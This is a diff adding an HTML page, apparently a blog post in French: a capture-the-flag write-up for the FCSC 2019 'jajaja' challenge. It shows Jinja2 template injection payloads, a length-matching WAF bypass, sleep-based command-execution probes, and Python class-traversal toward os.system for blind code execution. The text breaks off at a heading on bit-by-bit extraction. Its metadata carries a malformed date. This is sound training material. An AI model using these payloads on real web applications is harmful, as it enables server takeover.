@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.aaddf69428b38a6431e3b84a00ae39ccc4f159833076ec8e133fc58eafca6b8e.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+
+
+  
+  
+    
+  
+  
+    
+  
+
+
+
+
+<title itemprop="name">Thibaud Labat - [FR] Writeup FCSC 2019 - jajaja</title>
+<meta property="og:title" content=Thibaud&#32;Labat&#32;-&#32;[FR]&#32;Writeup&#32;FCSC&#32;2019&#32;-&#32;jajaja />
+<meta name="twitter:title" content=Thibaud&#32;Labat&#32;-&#32;[FR]&#32;Writeup&#32;FCSC&#32;2019&#32;-&#32;jajaja />
+<meta itemprop="name" content=Thibaud&#32;Labat&#32;-&#32;[FR]&#32;Writeup&#32;FCSC&#32;2019&#32;-&#32;jajaja />
+<meta name="application-name" content=Thibaud&#32;Labat&#32;-&#32;[FR]&#32;Writeup&#32;FCSC&#32;2019&#32;-&#32;jajaja />
+<meta property="og:site_name" content="Poison" />
+
+
+<meta name="description" content="" />
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
+
+
+<base href="/posts/writeup_fcsc_2019_jajaja/" />
+<link rel="canonical" href="/posts/writeup_fcsc_2019_jajaja/" itemprop="url" />
+<meta name="url" content="/posts/writeup_fcsc_2019_jajaja/" />
+<meta name="twitter:url" content="/posts/writeup_fcsc_2019_jajaja/" />
+<meta property="og:url" content="/posts/writeup_fcsc_2019_jajaja/" />
+
+
+
+
+
+<meta property="og:updated_time" content=19003-19-01T359:31:24&#43;0100 />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+<meta name="twitter:site" content="https://twitter.com" />
+<meta name="twitter:creator" content="https://twitter.com" />
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="Poison" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+
+
+<meta property="og:type" content="article" />
+<meta property="article:publisher" content="" />
+<meta property="og:article:published_time" content=19003-19-01T359:31:24&#43;0100 />
+<meta property="article:published_time" content=19003-19-01T359:31:24&#43;0100 />
+
+
+
+
+  <meta name="news_keywords" content="writeup" />
+  <meta property="article:section" content="writeup" />
+
+
+<script defer type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "Article",
+    "headline": "[FR] Writeup FCSC 2019 - jajaja",
+    "author": {
+      "@type": "Person",
+      "name": "https:\/\/github.com"
+    },
+    "datePublished": "2024-03-19",
+    "description": "",
+    "wordCount": "1891",
+    "mainEntityOfPage": "True",
+    "dateModified": "2024-03-19",
+    "image": {
+      "@type": "imageObject",
+      "url": ""
+    },
+    "publisher": {
+      "@type": "Organization",
+      "name": "Poison",
+      "logo": {
+        "@type": "imageObject",
+        "url": ""
+      }
+    }
+  }
+</script>
+
+
+
+<meta name="generator" content="Hugo 0.120.3">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.178e339ccb9acabffeebf9adbb0bb23c1ec0b72a2a50edee18a5007d4d5a68aa.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5a5a5a;
+        --link-color: #268bd2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #bf616a;
+        --code-background-color: #E5E5E5;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #eee;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9d9d9d;
+        --link-color: #268bd2;
+        --date-color: #9a9a9a;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #ff7f7f;
+        --code-background-color: #393D47;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="/">
+                <img src="/images/logo4.jpg" alt="brand image">
+            </a>
+        
+        
+            <a href="/">
+                <h1>Thibaud Labat</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    Cybersecurity enthusiast
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/posts/">Posts</a>
+                    </li>
+                    
+                        <li class="sub-heading">
+                            Recent
+                        </li>
+                        
+                            <li class="bullet">
+                                <a href="/posts/writeup_fcsc_2019_jajaja/">[FR] Writeup FCSC 2019 - jajaja</a>
+                            </li>
+                        
+                    
+                
+            
+            
+                
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="LinkedIn" href="https://linkedin.com">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Twitter" href="https://twitter.com">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="Discord" href="https://discord.com">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="YouTube" href="https://youtube.com">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M12.006 19.012h-.02c-.062 0-6.265-.012-7.83-.437a2.5 2.5 0 0 1-1.764-1.765A26.494 26.494 0 0 1 1.986 12a26.646 26.646 0 0 1 .417-4.817A2.564 2.564 0 0 1 4.169 5.4c1.522-.4 7.554-.4 7.81-.4H12c.063 0 6.282.012 7.831.437c.859.233 1.53.904 1.762 1.763c.29 1.594.427 3.211.407 4.831a26.568 26.568 0 0 1-.418 4.811a2.51 2.51 0 0 1-1.767 1.763c-1.52.403-7.553.407-7.809.407Zm-2-10.007l-.005 6l5.212-3l-5.207-3Z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="RSS Feed" href="//posts/index.xml">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280.000000 1280.000000">
+            <g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentColor">
+                <path d="M2295 11929 c-284 -12 -642 -45 -707 -65 -17 -5 -18 -63 -18 -1039 0 -569 4 -1036 8 -1039 5 -3 74 6 153 19 510 86 1168 95 1789 25 1348 -153 2602 -677 3670 -1531 385 -308 820 -744 1126 -1129 842 -1060 1362 -2313 1514 -3650 70 -621 61 -1279 -25 -1789 -13 -79 -22 -148 -19 -153 3 -4 471 -8 1039 -8 l1035 0 5 23 c51 225 85 942 67 1419 -23 605 -77 1044 -198 1617 -294 1400 -927 2734 -1823 3846 -1043 1295 -2364 2259 -3909 2854 -1158 447 -2451 656 -3707 600z"/>
+                <path d="M2255 7845 c-269 -25 -620 -81 -667 -106 -17 -9 -18 -55 -18 -899 0 -706 3 -890 13 -890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207 -107 2267 -823 2814 -1902 166 -327 268 -637 330 -1001 38 -227 48 -384 42 -662 -8 -348 -44 -590 -126 -831 -23 -66 -41 -126 -41 -132 0 -10 184 -13 890 -13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782 -59 703 -233 1323 -545 1945 -481 956 -1313 1788 -2270 2268 -620 310 -1239 483 -1940 542 -165 14 -669 10 -840 -5z"/>
+                <path d="M2519 3815 c-391 -66 -725 -336 -868 -703 -79 -201 -96 -462 -45 -677 83 -344 338 -641 666 -774 116 -47 205 -69 330 -80 412 -39 811 153 1040 500 193 292 240 648 128 981 -135 403 -492 699 -914 757 -100 14 -241 12 -337 -4z"/>
+            </g>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Email" href="mailto://user@domain">
+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2024 Poison. All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+    <h1 class="post-title">
+        <a href="/posts/writeup_fcsc_2019_jajaja/">[FR] Writeup FCSC 2019 - jajaja</a>
+    </h1>
+    
+        <time datetime="2024-03-19T13:59:31&#43;0100" class="post-date">
+            March 19, 2024
+        </time>
+    
+    
+    <ul class="tags">
+        
+        <li class="tag-web">
+            <a href="/tags/web">web</a>
+        </li>
+        
+        <li class="tag-jinja2">
+            <a href="/tags/jinja2">jinja2</a>
+        </li>
+        
+        <li class="tag-ssti">
+            <a href="/tags/ssti">ssti</a>
+        </li>
+        
+        <li class="tag-python">
+            <a href="/tags/python">python</a>
+        </li>
+        
+        <li class="tag-blind">
+            <a href="/tags/blind">blind</a>
+        </li>
+        
+        <li class="tag-fcsc">
+            <a href="/tags/fcsc">fcsc</a>
+        </li>
+        
+    </ul>
+    
+    
+    
+    
+    
+    
+</div>
+
+  <p>Dans ce <a href="https://hackropole.fr/fr/challenges/web/fcsc2019-web-jajaja/" target="_blank">challenge proposé lors du FCSC 2019</a>, nous sommes confrontés à un blog présentant sous ses articles une section commentaire. Notre objectif sera d&rsquo;injecter un code malicieux dans un commentaire afin de prendre le contrôle du serveur, et récupérer le <em>flag</em>.</p>
+<h2 id="petit-tour-du-propriétaire">Petit tour du propriétaire</h2>
+<p>Nous sommes en présence d&rsquo;un blog Wordpress, rien de plus classique.</p>
+<p><img src="/images/Writeup_FCSC_2019_jajaja/1.png" alt="Image"></p>
+<p>On observe sous le premier article l&rsquo;existence d&rsquo;une section commentaire. Le contenu de l&rsquo;article nous renseigne sur le caractère « fait maison » du code côté serveur de la section commentaire. On peut donc espérer une faille permettant l&rsquo;injection de code malicieux, du fait du manque d&rsquo;une validation correcte des entrées utilisateur. Tout ceci n&rsquo;est pour l&rsquo;instant que pure hypothèse, nous sommes en phase d&rsquo;exploration.</p>
+<p><img src="/images/Writeup_FCSC_2019_jajaja/2.png" alt="Image"></p>
+<p>Wordpress étant écrit en PHP, on essaye naïvement d&rsquo;injecter une balise PHP:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">system</span>(<span style="color:#e6db74">&#34;sleep 10&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>Si la page met 10 secondes à charger, on sait que l&rsquo;injection fonctionne.</p>
+<p><img src="/images/Writeup_FCSC_2019_jajaja/3.png" alt="Image"></p>
+<p>Malheureusement, aucun signe d&rsquo;injection réussie. Une inspection minutieuse du code source HTML de la page ne nous renseigne d&rsquo;ailleurs aucunement&hellip; à moins que&hellip;</p>
+<h2 id="tromperie-et-rires-hispanophones">Tromperie, et rires hispanophones</h2>
+<p>Le site affiche fièrement en pied de page : <code>Ce blog est propulsé par Wordpress</code>. Mais c&rsquo;est bien là le seul indice nous menant vers cette piste. Cette annonce ne serait-elle pas là justement pour nous induire en erreur ? Rappelons-nous le titre du challenge, <em>&ldquo;jajaja&rdquo;</em> (NDLR ; C&rsquo;est la traduction espagnole de notre <em>hahaha</em> français.) Le concepteur du challenge se moquerait-il ouvertement de nous ? (Oui.)</p>
+<p>Faisons une requête à la main avec <code>curl -v</code> et observons les <em>Headers</em> renvoyés par le serveur. (<code>-v</code> pour <em>verbose</em>, affiche les <em>Headers HTTP</em>)</p>
+<pre tabindex="0"><code>$ curl -v http://localhost:8000
+
+*   Trying 127.0.0.1:8000...
+* Connected to localhost (127.0.0.1) port 8000 (#0)
+&gt; GET / HTTP/1.1
+&gt; Host: localhost:8000
+&gt; User-Agent: curl/7.81.0
+&gt; Accept: */*
+
+* Mark bundle as not supporting multiuse
+* HTTP 1.0, assume close after body
+&lt; HTTP/1.0 200 OK
+&lt; Content-Type: text/html; charset=utf-8
+&lt; Content-Length: 3611
+&lt; Server: Werkzeug/2.0.3 Python/3.10.13
+&lt; Date: Tue, 19 Mar 2024 18:36:48 GMT
+&lt;
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&#34;en&#34;&gt;&lt;head&gt;
+&lt;meta http-equiv=&#34;content-type&#34; content=&#34;text/html; charset=UTF-8&#34;&gt;
+[... suite du code HTML de la page ... ]
+</code></pre><p>Dans les <em>Headers HTTP</em> renvoyés par le serveur, on peut lire <code>Server: Werkzeug/2.0.3 Python/3.10.13</code>. Il ne s&rsquo;agit donc pas d&rsquo;un site Wordpress ! Dans ce cas, le <em>Header</em> nous aurait parlé de <em>Apache2</em>, <em>Nginx</em> ou <em>PHP</em>&hellip; Nous avons été trompés.</p>
+<p>Une petite recherche sur Duckduckgo nous apprend qu&rsquo;il s&rsquo;agit probablement d&rsquo;un serveur <code>Flask</code>. Une deuxième nous apprend que le serveur utilise sans doute le système de <em>template</em> <code>Jinja2</code> (par défaut avec <code>Flask</code>). Cette bibliothèque permet d&rsquo;écrire du code Python directement dans les pages HTML.</p>
+<p>Essayons donc, au lieu de notre injection <em>PHP</em> une injection de <em>template Jinja2</em>.</p>
+<pre tabindex="0"><code>{{1+1}}
+</code></pre><p><img src="/images/Writeup_FCSC_2019_jajaja/4.png" alt="Image 403 WAF"></p>
+<p>Essayons aussi une injection invalide.</p>
+<pre tabindex="0"><code>{{ :&#34;&#39;é)ç^&amp;&#34; }}
+</code></pre><p><img src="/images/Writeup_FCSC_2019_jajaja/5.png" alt="Image Erreur 500"></p>
+<p>On est sur la bonne piste ! On a réussi à déclencher le <em>WAF</em> (<em>Web Application Firewall</em>), mais aussi une erreur.</p>
+<h2 id="première-injection-et-bypass-du-waf">Première injection et bypass du WAF</h2>
+<p>Le post de blog semble indiquer une stratégie d&rsquo;implémentation pour le filtre, qui peut nous permettre de le contourner en s&rsquo;assurant que le résultat de l&rsquo;évaluation fait la même taille que le script lui-même. Essayons donc un <em>payload</em> vérifiant cette contrainte.</p>
+<pre tabindex="0"><code>{{&#34;A&#34;*10}}
+</code></pre><p>Ce code fait 10 caractères, et sa sortie fait également 10 caractères. (<em>AAAAAAAAAA</em>)</p>
+<p><img src="/images/Writeup_FCSC_2019_jajaja/6.png" alt="Image bypass WAF"></p>
+<p>On a réussi à <em>bypass</em> le <em>WAF</em> ! Mais le résultat de l&rsquo;interprétation des templates n&rsquo;est pas affiché. Le <em>WAF</em> semble évaluer les commentaires pour détecter leur caractère malicieux (ie. contient un <em>template</em>), mais jette ensuite ce résultat aux ordures pour finalement afficher le texte original. Il nous est donc impossible d&rsquo;afficher quoi que ça soit. Nous avançons les yeux bandés.</p>
+<h2 id="objectif-exécuter-des-commandes-shell">Objectif: exécuter des commandes <em>shell</em></h2>
+<p>Puisque l&rsquo;on peut injecter du code Python, on a envie d&rsquo;exécuter un <em>reverse shell</em> pour prendre le contrôle du serveur. En Python, on peut exécuter des commandes systèmes (<em>shell</em>) arbitraires avec la fonction <code>os.system(&quot;COMMANDE&quot;)</code>.</p>
+<p>Sur un malentendu, essayons un <em>payload</em> Python classique. Si ça marche, on a gagné ! Ce code attendra 10 secondes avant de renvoyer la page, si l&rsquo;injection est réussie, et nous prouve qu&rsquo;on a réussi à exécuter des commandes arbitraires.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{{ __import__(<span style="color:#e6db74">&#34;os&#34;</span>)<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#34;sleep 10&#34;</span>)  }}
+</span></span></code></pre></div><p>Malheureusement, il n&rsquo;en est rien, et on se prend une erreur 500 :(</p>
+<p>La raison de cette erreur ici est que <code>__import__</code> est une fonction <em>built-in</em> innacessible dans le contexte des <em>templates Jinja2</em>. En fait, on ne sait même pas à quoi on a accès. Probablement pas grand-chose.</p>
+<h2 id="chasse-au-trésor">Chasse au trésor</h2>
+<p>Nous ne savons pas à quelles variables ou fonctions nous avons accès, mais nous avons toujours accès aux constantes faisant partie du langage : <code>[]</code>, <code>0</code>, <code>&quot;&quot;</code>, etc. À partir de celles, nous pouvons retrouver, grâce aux attributs spéciaux des variables Python, toutes les classes importées dans le <em>script</em>, et nous en servir. À partir de la chaîne de caractère vide, on récupère la classe <code>str</code>, puis sa classe parent <code>object</code>, puis toutes les classes enfant de <code>object</code>&hellip; c&rsquo;est-à-dire toutes les classes.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">str</span><span style="color:#e6db74">&#39;&gt;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>mro()[<span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">object</span><span style="color:#e6db74">&#39;&gt;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">&gt;&gt;&gt;</span> <span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>__class__<span style="color:#f92672">.</span>mro()[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>__subclasses__()
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">class</span> <span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#a6e22e">type</span><span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>async_generator<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>int<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>bytearray_iterator<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>bytearray<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>bytes_iterator<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>bytes<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>builtin_function_or_method<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>callable_iterator<span style="color:#e6db74">&#39;&gt;, &lt;class &#39;</span>PyCapsule<span style="color:#e6db74">&#39;&gt;, </span>
+</span></span><span style="display:flex;"><span>[<span style="color:#f92672">...</span> ensemble des classes importées en local <span style="color:#f92672">...</span>]
+</span></span></code></pre></div><p>J&rsquo;exécute ce code dans mon terminal <code>Python 3.11.8</code>. J&rsquo;ai la mauvaise version de Python, pas les mêmes bibliothèques, il n&rsquo;y a aucune chance pour que le serveur ait les mêmes classes dans le même ordre, dans cette liste !</p>
+<p>Si je savais quelles classes le serveur possède, je pourrais utiliser l&rsquo;une d&rsquo;entre elles pour importer <code>os</code> et appeler <code>os.system</code>, ou utiliser directement <code>subprocess.Popen</code> pour exécuter une commande. Les possibilités sont infinies. Mais je suis aveugle&hellip;</p>
+<h2 id="extraction-de-string-bit-par-bit">Extraction de string bit par bit</h2>
